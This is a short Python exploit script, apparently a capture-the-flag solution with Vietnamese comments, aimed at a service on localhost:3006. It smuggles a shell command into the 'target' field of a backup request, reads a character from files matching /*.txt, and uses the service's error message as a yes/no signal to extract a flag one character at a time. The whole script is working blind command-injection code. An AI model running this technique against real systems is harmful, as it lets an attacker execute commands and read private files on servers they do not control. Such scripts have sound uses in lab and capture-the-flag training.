import requests
import time
chat_brup = "qwertyuiopasdfghjklzxcvbnm.,/}{()1234567890QWERTYUIOPASDFGHJKLZXCVBNM_"
ket_qua = ""
for index1 in range(50):
    for i in chat_brup:
        url = "http://localhost:3006"
        data = {
            "command" : "backup",
            "target" : f"facebook --help;ket_qua=$(cat /*.txt | cut -c{index1}) ;if [ \"$ket_qua\" = \"{i}\" ]; then echo 'zip error' ;else echo 'a';fi #"
        }
        print(f"Dang tim kiem ki thu thu {index1} cua flag , dang kiem tra ki tu {i} Flag can tim la : {ket_qua}" , end = "\r")
        x = requests.post(url , data=data)
        if x.text == "Backup không thành công":
            ket_qua += i
            break
        time.sleep(0.1)